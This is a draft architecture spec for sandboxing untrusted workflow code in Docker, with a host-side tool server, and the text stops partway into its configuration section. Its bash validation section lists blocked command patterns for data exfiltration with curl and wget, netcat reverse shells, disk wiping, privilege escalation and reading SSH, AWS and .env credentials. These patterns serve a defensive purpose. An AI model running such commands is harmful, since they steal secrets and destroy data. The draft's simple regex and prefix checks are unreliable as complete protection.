# Sandboxed Workflow Execution Architecture

> **Document Version**: 1.0.0
> **Status**: Draft
> **Created**: 2026-01-21
> **Last Updated**: 2026-01-21

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Business Requirements](#2-business-requirements)
3. [Technical Requirements](#3-technical-requirements)
4. [System Architecture](#4-system-architecture)
5. [Component Specifications](#5-component-specifications)
6. [Communication Protocol](#6-communication-protocol)
7. [Security Model](#7-security-model)
8. [Configuration & Policies](#8-configuration--policies)
9. [Error Handling](#9-error-handling)
10. [Observability](#10-observability)
11. [CLI Integration](#11-cli-integration)
12. [Testing Strategy](#12-testing-strategy)
13. [Dependencies & Prerequisites](#13-dependencies--prerequisites)
14. [Migration & Adoption](#14-migration--adoption)
15. [Non-Functional Requirements](#15-non-functional-requirements)
16. [Constraints & Assumptions](#16-constraints--assumptions)
17. [Glossary](#17-glossary)
18. [Appendices](#18-appendices)

---

## 1. Executive Summary

### 1.1 Problem Statement

Claude Orchestrator workflows are TypeScript files that execute with full Node.js/Bun runtime access. When users download and run workflows from external sources (GitHub, npm, shared repositories), these workflows have unrestricted access to:

- Host filesystem (including sensitive files like `~/.ssh`, `~/.aws`)
- Network (can exfiltrate data)
- Environment variables (API keys, secrets)
- Child processes (arbitrary command execution)
- System resources (CPU, memory, disk)

This creates a significant security risk when running untrusted workflows, limiting the ecosystem's ability to share and distribute reusable workflows safely.

### 1.2 Proposed Solution

Implement a **sandboxed execution mode** where:

1. **Workflow code** runs inside an isolated Docker container with no direct access to host resources
2. **Tools** (bash, Claude, git, files, docker) execute on the host machine via a **Tool Server**
3. Communication happens through a **Unix socket** mounted into the container
4. Each tool can enforce its own security policies on the host side

This architecture provides:
- **Strong isolation** for untrusted workflow code
- **Full functionality** for legitimate tool operations
- **Granular control** over what operations are permitted
- **Audit trail** of all tool invocations

### 1.3 Key Benefits

| Stakeholder | Benefit |
|-------------|---------|
| **Workflow Users** | Safely run workflows from any source |
| **Workflow Authors** | Share workflows without liability concerns |
| **Organizations** | Enforce security policies on workflow execution |
| **Ecosystem** | Enable a marketplace of reusable workflows |

---

## 2. Business Requirements

### 2.1 User Stories (High-Level)

#### US-1: Safe External Workflow Execution
> As a developer, I want to run workflows downloaded from GitHub or npm without risking my system security, so that I can leverage community-created automation safely.

**Acceptance Criteria:**
- External workflows cannot access files outside the project directory
- External workflows cannot make network requests except through approved tools
- External workflows cannot access environment variables from the host
- External workflows cannot spawn arbitrary processes on the host
- All tool invocations are logged for audit purposes

#### US-2: Full Tool Functionality in Sandbox
> As a developer running sandboxed workflows, I want full access to Claude Code, Git, Docker, and other tools, so that the sandbox doesn't limit legitimate workflow capabilities.

**Acceptance Criteria:**
- Claude Code / agentSession works with full capabilities
- Git operations work on the actual repository
- Docker commands can be executed on the host (when permitted)
- File operations work within the project directory
- Bash commands execute on the host with configured restrictions

#### US-3: Configurable Security Policies
> As a team lead, I want to configure security policies for sandboxed workflow execution, so that I can balance security with functionality for my team's needs.

**Acceptance Criteria:**
- Can configure allowed bash commands (whitelist)
- Can set maximum Claude API budget per workflow
- Can restrict file access to specific directories
- Can enable/disable Docker access
- Can set resource limits (memory, CPU, timeout)

#### US-4: Transparent Sandbox Experience
> As a workflow author, I want workflows to work identically in sandbox and native modes, so that I don't need to write different code for each mode.

**Acceptance Criteria:**
- Workflow code syntax is identical for both modes
- Tool API signatures are unchanged
- Only execution environment differs
- Clear error messages when sandbox restrictions block operations

#### US-5: Trust Levels
> As a developer, I want different trust levels for workflows based on their source, so that I can run my own workflows without restrictions while sandboxing external ones.

**Acceptance Criteria:**
- Local workflows (in project) run natively by default
- External workflows require explicit `--sandbox` flag or configuration
- Warning displayed before running external workflows without sandbox
- Trust can be granted to specific sources/publishers

### 2.2 Business Rules

| ID | Rule |
|----|------|
| BR-1 | Workflows from external sources MUST NOT execute without user acknowledgment |
| BR-2 | Sandboxed workflows MUST NOT have direct network access |
| BR-3 | Tool Server MUST validate all requests before execution |
| BR-4 | All tool invocations in sandbox mode MUST be logged |
| BR-5 | Claude API budget limits MUST be enforced server-side |
| BR-6 | File operations MUST be restricted to configured paths |
| BR-7 | Container MUST be destroyed after workflow completion |
| BR-8 | Sandbox mode MUST be available on Linux and macOS (via Docker) |

### 2.3 Success Metrics

| Metric | Target |
|--------|--------|
| Sandbox overhead (startup time) | < 2 seconds |
| Tool invocation latency overhead | < 50ms per call |
| Memory overhead | < 100MB for sandbox infrastructure |
| Security incidents from sandboxed workflows | 0 |
| Workflow compatibility (sandbox vs native) | 100% for supported tools |

---

## 3. Technical Requirements

### 3.1 Functional Requirements

#### FR-1: Container Isolation
- FR-1.1: Workflow code MUST run inside a Docker container
- FR-1.2: Container MUST have no network access (`--network=none`)
- FR-1.3: Container filesystem MUST be read-only except for `/tmp`
- FR-1.4: Container MUST run as non-root user
- FR-1.5: Container MUST have dangerous Node.js modules blocked
- FR-1.6: Container MUST be removed after workflow completion

#### FR-2: Tool Server
- FR-2.1: Tool Server MUST run on the host machine
- FR-2.2: Tool Server MUST listen on a Unix socket
- FR-2.3: Tool Server MUST validate all incoming requests
- FR-2.4: Tool Server MUST enforce configured security policies
- FR-2.5: Tool Server MUST log all tool invocations
- FR-2.6: Tool Server MUST handle concurrent requests
- FR-2.7: Tool Server MUST gracefully handle container disconnection

#### FR-3: Tool Proxy (Container Side)
- FR-3.1: Tool Proxy MUST implement the same interface as native tools
- FR-3.2: Tool Proxy MUST serialize requests to JSON
- FR-3.3: Tool Proxy MUST communicate via Unix socket
- FR-3.4: Tool Proxy MUST handle server errors gracefully
- FR-3.5: Tool Proxy MUST support streaming responses (for long-running tools)

#### FR-4: Supported Tools
The following tools MUST work in sandbox mode:

| Tool | Host Execution | Notes |
|------|----------------|-------|
| `bash` | Yes | Configurable whitelist |
| `agentSession` | Yes | Budget enforcement |
| `planningAgentSession` | Yes | Budget enforcement |
| `parallelClaude` | Yes | Budget enforcement |
| `claudeSdk` | Yes | Budget enforcement |
| `git.*` | Yes | Full git operations |
| `files.*` | Yes | Path restrictions |
| `docker` | Yes | Optional, disabled by default |
| `checklist` | Yes | Uses claudeSdk |
| `json` | Container | Pure computation, no host access needed |
| `getVar/setVar` | Container | Local state only |
| `log/emit` | Yes | Events sent to host |

#### FR-5: Configuration
- FR-5.1: Security policies MUST be configurable via CLI flags
- FR-5.2: Security policies MUST be configurable via config file
- FR-5.3: Per-workflow policy overrides MUST be supported
- FR-5.4: Default policies MUST be secure (deny by default)

### 3.2 Non-Functional Requirements

See [Section 15](#15-non-functional-requirements) for detailed NFRs.

---

## 4. System Architecture

### 4.1 High-Level Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                          USER MACHINE                                │
│                                                                      │
│  ┌────────────────────────────────────────────────────────────────┐ │
│  │                     DOCKER CONTAINER                            │ │
│  │                    (Isolated Network)                           │ │
│  │                                                                 │ │
│  │  ┌─────────────────────────────────────────────────────────┐   │ │
│  │  │                  Workflow Runtime                        │   │ │
│  │  │                                                          │   │ │
│  │  │  ┌──────────────┐    ┌──────────────┐                   │   │ │
│  │  │  │  workflow.ts │───▶│  Tool Proxy  │                   │   │ │
│  │  │  │  (untrusted) │    │   Client     │                   │   │ │
│  │  │  └──────────────┘    └──────┬───────┘                   │   │ │
│  │  │                             │                            │   │ │
│  │  └─────────────────────────────┼────────────────────────────┘   │ │
│  │                                │                                 │ │
│  │                    Unix Socket │ /var/run/cw-tools.sock         │ │
│  │                                │                                 │ │
│  └────────────────────────────────┼─────────────────────────────────┘ │
│                                   │                                   │
│  ─────────────────────────────────┼─────────────────────────────────  │
│            Container Boundary     │     Host Access                   │
│  ─────────────────────────────────┼─────────────────────────────────  │
│                                   │                                   │
│  ┌────────────────────────────────┼─────────────────────────────────┐ │
│  │                                ▼                                  │ │
│  │  ┌─────────────────────────────────────────────────────────────┐ │ │
│  │  │                      TOOL SERVER                             │ │ │
│  │  │                                                              │ │ │
│  │  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐  │ │ │
│  │  │  │  Request    │  │  Security   │  │   Tool              │  │ │ │
│  │  │  │  Router     │─▶│  Validator  │─▶│   Executor          │  │ │ │
│  │  │  └─────────────┘  └─────────────┘  └──────────┬──────────┘  │ │ │
│  │  │                                               │              │ │ │
│  │  └───────────────────────────────────────────────┼──────────────┘ │ │
│  │                                                  │                │ │
│  │                HOST TOOL IMPLEMENTATIONS         │                │ │
│  │                                                  │                │ │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌────────┐ │ │
│  │  │  Bash    │ │  Claude  │ │   Git    │ │  Files   │ │ Docker │ │ │
│  │  │  Tool    │ │  Agent   │ │   Tool   │ │   Tool   │ │  Tool  │ │ │
│  │  └────┬─────┘ └────┬─────┘ └────┬─────┘ └────┬─────┘ └───┬────┘ │ │
│  │       │            │            │            │           │      │ │
│  └───────┼────────────┼────────────┼────────────┼───────────┼──────┘ │
│          │            │            │            │           │        │
│          ▼            ▼            ▼            ▼           ▼        │
│     ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌───────┐   │
│     │ Shell   │  │ Claude  │  │  .git   │  │ Project │  │Docker │   │
│     │         │  │  API    │  │  Repo   │  │  Files  │  │Daemon │   │
│     └─────────┘  └─────────┘  └─────────┘  └─────────┘  └───────┘   │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘
```

### 4.2 Component Overview

| Component | Location | Responsibility |
|-----------|----------|----------------|
| Workflow Runtime | Container | Execute workflow graph, manage state |
| Tool Proxy Client | Container | Serialize tool calls, communicate with server |
| Tool Server | Host | Receive requests, validate, route to tools |
| Security Validator | Host | Enforce policies, validate inputs |
| Tool Implementations | Host | Execute actual tool operations |
| Event Bridge | Both | Forward workflow events to host |

### 4.3 Data Flow

```
┌─────────────────────────────────────────────────────────────────────┐
│                        TOOL INVOCATION FLOW                          │
└─────────────────────────────────────────────────────────────────────┘

 Workflow Code          Tool Proxy           Tool Server          Tool
      │                     │                     │                 │
      │  tools.bash(cmd)    │                     │                 │
      │────────────────────▶│                     │                 │
      │                     │                     │                 │
      │                     │  POST /tools/bash   │                 │
      │                     │  {command, options} │                 │
      │                     │────────────────────▶│                 │
      │                     │                     │                 │
      │                     │                     │ validate(req)   │
      │                     │                     │────────┐        │
      │                     │                     │        │        │
      │                     │                     │◀───────┘        │
      │                     │                     │                 │
      │                     │                     │ if valid:       │
      │                     │                     │ execute(cmd)    │
      │                     │                     │────────────────▶│
      │                     │                     │                 │
      │                     │                     │     result      │
      │                     │                     │◀────────────────│
      │                     │                     │                 │
      │                     │   {success, result} │                 │
      │                     │◀────────────────────│                 │
      │                     │                     │                 │
      │    BashResult       │                     │                 │
      │◀────────────────────│                     │                 │
      │                     │                     │                 │
```

### 4.4 Sequence Diagram: Full Sandbox Lifecycle

```
     CLI              Tool Server           Docker            Container
      │                    │                   │                   │
      │  cw run --sandbox  │                   │                   │
      │────────┐           │                   │                   │
      │        │           │                   │                   │
      │  create socket     │                   │                   │
      │◀───────┘           │                   │                   │
      │                    │                   │                   │
      │  start server      │                   │                   │
      │───────────────────▶│                   │                   │
      │                    │                   │                   │
      │  docker run        │                   │                   │
      │───────────────────────────────────────▶│                   │
      │                    │                   │                   │
      │                    │                   │  create container │
      │                    │                   │──────────────────▶│
      │                    │                   │                   │
      │                    │                   │  mount socket     │
      │                    │                   │──────────────────▶│
      │                    │                   │                   │
      │                    │                   │  start workflow   │
      │                    │                   │──────────────────▶│
      │                    │                   │                   │
      │                    │   tool requests   │                   │
      │                    │◀──────────────────────────────────────│
      │                    │                   │                   │
      │                    │──┐ execute tools  │                   │
      │                    │  │                │                   │
      │                    │◀─┘                │                   │
      │                    │                   │                   │
      │                    │   tool responses  │                   │
      │                    │──────────────────────────────────────▶│
      │                    │                   │                   │
      │                    │                   │  workflow done    │
      │                    │                   │◀──────────────────│
      │                    │                   │                   │
      │                    │  container exit   │                   │
      │◀──────────────────────────────────────│                   │
      │                    │                   │                   │
      │  stop server       │                   │                   │
      │───────────────────▶│                   │                   │
      │                    │                   │                   │
      │  cleanup socket    │                   │                   │
      │────────┐           │                   │                   │
      │        │           │                   │                   │
      │◀───────┘           │                   │                   │
      │                    │                   │                   │
```

---

## 5. Component Specifications

### 5.1 Tool Server

#### 5.1.1 Purpose
The Tool Server is a host-side process that receives tool invocation requests from sandboxed workflows, validates them against security policies, and executes them using the native tool implementations.

#### 5.1.2 Location
`src/sandbox/server/toolServer.ts`

#### 5.1.3 Interface

```typescript
interface ToolServerConfig {
  /** Unix socket path for communication */
  socketPath: string;

  /** Project directory (used for path validation) */
  projectPath: string;

  /** Temporary directory for workflow artifacts */
  tempDir: string;

  /** Security policy configuration */
  policy: SecurityPolicy;

  /** Event emitter for workflow events */
  emitter?: WorkflowEmitter;

  /** Claude configuration (API keys, etc.) */
  claudeConfig?: ClaudeConfig;

  /** Tmux manager for interactive tools */
  tmuxManager?: TmuxManager;
}

interface ToolServer {
  /** Start the server and begin accepting connections */
  start(): Promise<void>;

  /** Stop the server and cleanup resources */
  stop(): Promise<void>;

  /** Check if server is running */
  isRunning(): boolean;

  /** Get server statistics */
  getStats(): ToolServerStats;
}

interface ToolServerStats {
  requestsReceived: number;
  requestsSucceeded: number;
  requestsFailed: number;
  requestsDenied: number;
  activeRequests: number;
  uptime: number;
}
```

#### 5.1.4 Request/Response Protocol

```typescript
/** Request sent from container to host */
interface ToolRequest {
  /** Unique request identifier for correlation */
  requestId: string;

  /** Tool name (bash, agentSession, git, files, etc.) */
  tool: string;

  /** Method name for tools with multiple operations (git.status, files.read) */
  method: string;

  /** Arguments to pass to the tool */
  args: unknown[];

  /** Request timestamp for timeout calculation */
  timestamp: number;
}

/** Response sent from host to container */
interface ToolResponse {
  /** Correlation ID matching the request */
  requestId: string;

  /** Whether the tool execution succeeded */
  success: boolean;

  /** Tool result (if success=true) */
  result?: unknown;

  /** Error information (if success=false) */
  error?: {
    code: string;
    message: string;
    details?: unknown;
  };

  /** Execution metadata */
  metadata: {
    duration: number;
    toolVersion: string;
  };
}
```

#### 5.1.5 Supported Tools

| Tool | Methods | Host Resources Used |
|------|---------|---------------------|
| `bash` | `execute` | Shell, filesystem, environment |
| `agentSession` | `execute` | Claude API, filesystem, tmux |
| `planningAgentSession` | `execute` | Claude API, filesystem |
| `parallelClaude` | `execute` | Claude API |
| `claudeSdk` | `execute` | Claude API |
| `git` | `status`, `add`, `commit`, `push`, `pull`, `branch`, `checkout`, `diff`, `log`, `stash`, `worktree*` | Git repository |
| `files` | `read`, `write`, `exists`, `list`, `delete`, `copy`, `move` | Filesystem |
| `docker` | `execute` | Docker daemon |
| `checklist` | `execute` | Claude API |
| `hook` | `execute` | Configured hooks |
| `events` | `emit`, `log` | Event emitter |

#### 5.1.6 Error Codes

| Code | Description |
|------|-------------|
| `TOOL_NOT_FOUND` | Requested tool does not exist |
| `METHOD_NOT_FOUND` | Requested method does not exist on tool |
| `VALIDATION_FAILED` | Request failed security validation |
| `POLICY_DENIED` | Request denied by security policy |
| `EXECUTION_FAILED` | Tool execution threw an error |
| `TIMEOUT` | Tool execution exceeded timeout |
| `BUDGET_EXCEEDED` | Claude API budget exhausted |
| `PATH_VIOLATION` | File path outside allowed directories |
| `COMMAND_DENIED` | Bash command not in whitelist |

### 5.2 Tool Proxy Client

#### 5.2.1 Purpose
The Tool Proxy Client runs inside the container and provides the same interface as native WorkflowTools, but serializes calls and sends them to the Tool Server via Unix socket.

#### 5.2.2 Location
`src/sandbox/client/toolProxy.ts`

#### 5.2.3 Interface

```typescript
interface ToolProxyConfig {
  /** Unix socket path (mounted from host) */
  socketPath: string;

  /** Request timeout in milliseconds */
  timeoutMs: number;

  /** Retry configuration for transient failures */
  retry: {
    maxAttempts: number;
    backoffMs: number;
  };
}

/** Creates a WorkflowTools implementation that proxies to the host */
function createToolProxy(config: ToolProxyConfig): WorkflowTools;
```

#### 5.2.4 Implementation Requirements

1. **Same Interface**: Must implement `WorkflowTools` interface exactly
2. **Serialization**: All arguments must be JSON-serializable
3. **Error Mapping**: Server errors must be mapped to appropriate tool errors
4. **Streaming Support**: Long-running tools (agentSession) must support streaming
5. **Timeout Handling**: Must handle both client and server timeouts
6. **Connection Recovery**: Must handle socket disconnection gracefully

#### 5.2.5 Local vs Proxied Operations

Some operations can run locally in the container without calling the host:

| Operation | Location | Reason |
|-----------|----------|--------|
| `getVar` / `setVar` | Container | State is local to workflow |
| `interpolate` | Container | Pure string manipulation |
| `json.*` | Container | Pure JSON operations |
| `schema.*` | Container | Pure validation |
| `createIterator` | Container | Local iteration state |

### 5.3 Sandbox Runner

#### 5.3.1 Purpose
The Sandbox Runner is the entry point inside the container. It loads the workflow, creates the proxy tools, and executes the workflow graph.

#### 5.3.2 Location
`src/sandbox/runner/sandboxRunner.ts`

#### 5.3.3 Responsibilities

1. Load and validate workflow definition
2. Create Tool Proxy Client
3. Build workflow graph
4. Execute workflow with proxy tools
5. Report completion status to host
6. Handle uncaught errors

#### 5.3.4 Container Environment

```typescript
interface SandboxEnvironment {
  /** Path to workflow file (mounted read-only) */
  WORKFLOW_PATH: string;

  /** Unix socket path for tool communication */
  TOOL_SOCKET: string;

  /** Request timeout for tools */
  TOOL_TIMEOUT_MS: string;

  /** Workflow input variables (JSON) */
  WORKFLOW_INPUT: string;
}
```

### 5.4 Security Validator

#### 5.4.1 Purpose
The Security Validator checks all tool requests against configured policies before execution.

#### 5.4.2 Location
`src/sandbox/server/securityValidator.ts`

#### 5.4.3 Interface

```typescript
interface SecurityValidator {
  /** Validate a tool request against policies */
  validate(request: ToolRequest): ValidationResult;

  /** Update policies at runtime */
  updatePolicy(policy: Partial<SecurityPolicy>): void;

  /** Get current policy */
  getPolicy(): SecurityPolicy;
}

interface ValidationResult {
  allowed: boolean;
  reason?: string;
  warnings?: string[];
  transformedRequest?: ToolRequest; // For policy-based modifications
}
```

#### 5.4.4 Validation Rules

| Tool | Validation |
|------|------------|
| `bash` | Command whitelist check, dangerous pattern detection |
| `agentSession` | Budget limit enforcement, model restrictions |
| `files.*` | Path must be within allowed directories |
| `git.*` | Repository must be the current project |
| `docker` | Must be explicitly enabled in policy |
| All | Rate limiting, request size limits |

### 5.5 Docker Container Image

#### 5.5.1 Purpose
A minimal Docker image containing only what's needed to run workflows.

#### 5.5.2 Location
`docker/Dockerfile.sandbox`

#### 5.5.3 Specifications

```dockerfile
# Base image with Bun runtime
FROM oven/bun:1.0-slim AS base

# Security: Run as non-root user
RUN useradd -m -u 1000 sandboxuser
USER sandboxuser

# Minimal filesystem
WORKDIR /sandbox

# Copy only runner code (no workflow yet)
COPY --chown=sandboxuser dist/sandbox-runner /sandbox/runner

# Block dangerous Node.js modules via policy
COPY --chown=sandboxuser sandbox-policy.json /sandbox/policy.json

# Environment
ENV NODE_OPTIONS="--experimental-policy=/sandbox/policy.json"
ENV TOOL_SOCKET="/var/run/cw-tools.sock"

# Entry point
ENTRYPOINT ["bun", "run", "/sandbox/runner/index.js"]
```

#### 5.5.4 Module Policy

```json
{
  "scopes": {
    "file:///sandbox/": {
      "integrity": true,
      "dependencies": {
        "node:fs": false,
        "node:child_process": false,
        "node:net": false,
        "node:http": false,
        "node:https": false,
        "node:dgram": false,
        "node:cluster": false,
        "node:worker_threads": false,
        "fs": false,
        "child_process": false,
        "net": false,
        "http": false,
        "https": false
      }
    }
  }
}
```

#### 5.5.5 Container Runtime Flags

```bash
docker run \
  --rm \                              # Remove after exit
  --network=none \                    # No network access
  --read-only \                       # Read-only filesystem
  --tmpfs /tmp:size=100M \            # Writable /tmp with limit
  --memory=512m \                     # Memory limit
  --cpus=1 \                          # CPU limit
  --pids-limit=100 \                  # Process limit
  --cap-drop=ALL \                    # Drop all capabilities
  --security-opt=no-new-privileges \  # No privilege escalation
  --user=1000:1000 \                  # Non-root user
  -v /path/to/socket:/var/run/cw-tools.sock:rw \  # Tool socket
  -v /path/to/workflow.ts:/sandbox/workflow.ts:ro \ # Workflow (read-only)
  cw-sandbox:latest \
  /sandbox/workflow.ts
```

---

## 6. Communication Protocol

### 6.1 Transport Layer

- **Protocol**: Unix Domain Socket (UDS)
- **Path**: `/var/run/cw-tools.sock` (configurable)
- **Framing**: Newline-delimited JSON (NDJSON)

### 6.2 Message Format

```typescript
/** Base message structure */
interface Message {
  type: "request" | "response" | "event" | "ping" | "pong";
  id: string;
  timestamp: number;
}

/** Tool invocation request */
interface RequestMessage extends Message {
  type: "request";
  tool: string;
  method: string;
  args: unknown[];
}

/** Tool invocation response */
interface ResponseMessage extends Message {
  type: "response";
  requestId: string;
  success: boolean;
  result?: unknown;
  error?: ErrorInfo;
}

/** Workflow event (logs, custom events) */
interface EventMessage extends Message {
  type: "event";
  eventType: string;
  payload: Record<string, unknown>;
}

/** Health check */
interface PingMessage extends Message {
  type: "ping";
}

interface PongMessage extends Message {
  type: "pong";
}
```

### 6.3 Streaming Protocol

For long-running tools (like `agentSession`), streaming is supported:

```typescript
/** Stream start message */
interface StreamStartMessage extends Message {
  type: "response";
  requestId: string;
  streaming: true;
  streamId: string;
}

/** Stream chunk */
interface StreamChunkMessage extends Message {
  type: "stream";
  streamId: string;
  chunk: unknown;
  index: number;
}

/** Stream end */
interface StreamEndMessage extends Message {
  type: "stream-end";
  streamId: string;
  success: boolean;
  result?: unknown;
  error?: ErrorInfo;
}
```

### 6.4 Connection Lifecycle

1. **Container starts**: Runner connects to socket
2. **Handshake**: Runner sends version/capability info
3. **Ready**: Server acknowledges, connection established
4. **Requests**: Runner sends requests, server responds
5. **Events**: Runner sends events for logging
6. **Keepalive**: Periodic ping/pong for health
7. **Completion**: Runner sends completion message
8. **Disconnect**: Socket closed, container exits

### 6.5 Error Handling

| Scenario | Behavior |
|----------|----------|
| Socket not available | Runner exits with error code |
| Server timeout | Client retries with backoff |
| Malformed message | Respond with parse error |
| Unknown tool | Respond with TOOL_NOT_FOUND |
| Policy violation | Respond with POLICY_DENIED |
| Tool throws | Respond with EXECUTION_FAILED |

---

## 7. Security Model

### 7.1 Threat Model

#### 7.1.1 Threats Mitigated

| Threat | Mitigation |
|--------|------------|
| **T1**: Malicious workflow reads sensitive files | Container has no filesystem access; file tool validates paths |
| **T2**: Malicious workflow exfiltrates data via network | Container has no network; only tool socket mounted |
| **T3**: Malicious workflow runs arbitrary commands | Bash tool uses whitelist or is disabled |
| **T4**: Malicious workflow consumes excessive API credits | Budget limits enforced server-side |
| **T5**: Malicious workflow modifies system files | Container filesystem is read-only |
| **T6**: Malicious workflow escapes container | Standard Docker security + hardened config |
| **T7**: Malicious workflow accesses env vars | Only explicitly passed vars available |
| **T8**: Malicious workflow spawns processes | Process limit enforced, child_process blocked |

#### 7.1.2 Trust Boundaries

```
┌─────────────────────────────────────────────────────────────────┐
│                      UNTRUSTED ZONE                              │
│                                                                  │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  Container                                                 │  │
│  │  • Workflow code                                          │  │
│  │  • Tool Proxy Client                                      │  │
│  │  • Workflow state                                         │  │
│  └───────────────────────────────────────────────────────────┘  │
│                              │                                   │
│                              │ Unix Socket (validated)          │
│                              ▼                                   │
├──────────────────────────────┼───────────────────────────────────┤
│                              │                                   │
│                      TRUST BOUNDARY                              │
│                              │                                   │
├──────────────────────────────┼───────────────────────────────────┤
│                              │                                   │
│                       TRUSTED ZONE                               │
│                                                                  │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  Tool Server                                               │  │
│  │  • Security Validator (enforces policies)                 │  │
│  │  • Tool implementations                                   │  │
│  │  • Host resources                                         │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 7.2 Security Policies

#### 7.2.1 Policy Structure

```typescript
interface SecurityPolicy {
  /** Bash command restrictions */
  bash: {
    enabled: boolean;
    mode: "whitelist" | "blacklist" | "unrestricted";
    whitelist?: string[];    // Allowed command prefixes
    blacklist?: string[];    // Denied command patterns (regex)
    maxOutputSize?: number;  // Max stdout/stderr bytes
    timeout?: number;        // Max execution time
  };

  /** Claude API restrictions */
  claude: {
    enabled: boolean;
    maxBudgetUsd: number;
    allowedModels?: string[];
    maxConcurrentSessions?: number;
  };

  /** File access restrictions */
  files: {
    enabled: boolean;
    allowedReadPaths: string[];   // Glob patterns
    allowedWritePaths: string[];  // Glob patterns
    deniedPaths: string[];        // Always denied (e.g., .git/config)
    maxFileSizeBytes?: number;
  };

  /** Git restrictions */
  git: {
    enabled: boolean;
    allowRead: boolean;   // status, log, diff
    allowWrite: boolean;  // add, commit
    allowPush: boolean;   // push, pull
    allowBranch: boolean; // branch operations
  };

  /** Docker access */
  docker: {
    enabled: boolean;
    allowedCommands?: string[];  // e.g., ["build", "run", "ps"]
  };

  /** Resource limits */
  resources: {
    maxMemoryMb: number;
    maxCpuPercent: number;
    maxDurationSec: number;
    maxRequestsPerMinute: number;
  };
}
```

#### 7.2.2 Default Policy (Restrictive)

```typescript
const DEFAULT_POLICY: SecurityPolicy = {
  bash: {
    enabled: true,
    mode: "whitelist",
    whitelist: [
      "bun test",
      "bun run",
      "npm test",
      "npm run",
      "pnpm test",
      "pnpm run",
      "yarn test",
      "yarn run",
    ],
    maxOutputSize: 1024 * 1024, // 1MB
    timeout: 300000, // 5 minutes
  },
  claude: {
    enabled: true,
    maxBudgetUsd: 5.0,
    allowedModels: ["sonnet", "haiku"],
  },
  files: {
    enabled: true,
    allowedReadPaths: ["**/*"],
    allowedWritePaths: [".cw/**", "src/**", "test/**", "tests/**"],
    deniedPaths: [
      ".git/config",
      ".env",
      ".env.*",
      "**/*.pem",
      "**/*.key",
      "**/credentials*",
      "**/secrets*",
    ],
  },
  git: {
    enabled: true,
    allowRead: true,
    allowWrite: true,
    allowPush: false,
    allowBranch: true,
  },
  docker: {
    enabled: false,
  },
  resources: {
    maxMemoryMb: 512,
    maxCpuPercent: 100,
    maxDurationSec: 3600, // 1 hour
    maxRequestsPerMinute: 100,
  },
};
```

#### 7.2.3 Permissive Policy (Opt-in)

```typescript
const PERMISSIVE_POLICY: SecurityPolicy = {
  bash: {
    enabled: true,
    mode: "blacklist",
    blacklist: [
      "rm -rf /",
      "mkfs",
      "dd if=",
      "> /dev/",
      "chmod 777",
    ],
    timeout: 600000,
  },
  claude: {
    enabled: true,
    maxBudgetUsd: 50.0,
    // All models allowed
  },
  files: {
    enabled: true,
    allowedReadPaths: ["**/*"],
    allowedWritePaths: ["**/*"],
    deniedPaths: [".env", ".env.*", "**/*.pem", "**/*.key"],
  },
  git: {
    enabled: true,
    allowRead: true,
    allowWrite: true,
    allowPush: true,
    allowBranch: true,
  },
  docker: {
    enabled: true,
    // All docker commands allowed
  },
  resources: {
    maxMemoryMb: 2048,
    maxCpuPercent: 200, // Allow 2 CPUs
    maxDurationSec: 7200,
    maxRequestsPerMinute: 500,
  },
};
```

### 7.3 Bash Command Validation

#### 7.3.1 Dangerous Patterns (Always Blocked)

```typescript
const DANGEROUS_PATTERNS = [
  // Data exfiltration
  /curl\s+.*--data|curl\s+.*-d\s/i,
  /wget\s+.*--post/i,
  /nc\s+-e/i,  // netcat reverse shell

  // System destruction
  /rm\s+-rf\s+\/(?!\w)/,  // rm -rf / (but allow /project/...)
  /mkfs/i,
  /dd\s+if=.*of=\/dev/i,

  // Privilege escalation
  /sudo/i,
  /su\s+-/i,
  /chmod\s+[0-7]*777/i,
  /chown\s+root/i,

  // Persistence
  /crontab/i,
  /systemctl\s+enable/i,
  />> \/etc/i,

  // Credential theft
  /cat\s+.*\.ssh/i,
  /cat\s+.*\.aws/i,
  /cat\s+.*\.gnupg/i,
  /cat\s+.*\.env/i,

  // Environment variable access
  /printenv/i,
  /\$\{?\w*KEY\w*\}?/i,
  /\$\{?\w*SECRET\w*\}?/i,
  /\$\{?\w*TOKEN\w*\}?/i,
  /\$\{?\w*PASSWORD\w*\}?/i,
];
```

#### 7.3.2 Whitelist Matching

```typescript
function isCommandAllowed(command: string, whitelist: string[]): boolean {
  const normalizedCommand = command.trim().toLowerCase();

  return whitelist.some(allowed => {
    const normalizedAllowed = allowed.trim().toLowerCase();

    // Exact match
    if (normalizedCommand === normalizedAllowed) return true;

    // Prefix match (e.g., "bun test" allows "bun test --watch")
    if (normalizedCommand.startsWith(normalizedAllowed + " ")) return true;
    if (normalizedCommand.startsWith(normalizedAllowed + "\t")) return true;

    return false;
  });
}
```

### 7.4 Path Validation

```typescript
function validatePath(
  requestedPath: string,
  allowedPatterns: string[],
  deniedPatterns: string[],
  projectRoot: string
): ValidationResult {
  // Resolve to absolute path
  const absolutePath = path.resolve(projectRoot, requestedPath);

  // Must be within project root (prevent traversal)
  if (!absolutePath.startsWith(projectRoot)) {
    return { allowed: false, reason: "Path traversal detected" };
  }

  // Check denied patterns first
  for (const pattern of deniedPatterns) {
    if (minimatch(absolutePath, pattern) || minimatch(requestedPath, pattern)) {
      return { allowed: false, reason: `Path matches denied pattern: ${pattern}` };
    }
  }

  // Check allowed patterns
  for (const pattern of allowedPatterns) {
    if (minimatch(absolutePath, pattern) || minimatch(requestedPath, pattern)) {
      return { allowed: true };
    }
  }

  return { allowed: false, reason: "Path not in allowed patterns" };
}
```

### 7.5 Budget Enforcement

```typescript
interface BudgetTracker {
  /** Current session spending */
  currentSpendUsd: number;

  /** Maximum allowed */
  maxBudgetUsd: number;

  /** Check if request is within budget */
  canSpend(estimatedCostUsd: number): boolean;

  /** Record actual spending */
  recordSpend(actualCostUsd: number): void;

  /** Get remaining budget */
  remainingBudgetUsd(): number;
}
```

---

## 8. Configuration & Policies

### 8.1 Configuration Sources

Configuration is loaded from multiple sources with the following precedence (highest to lowest):

1. CLI flags (`--max-budget=10`)
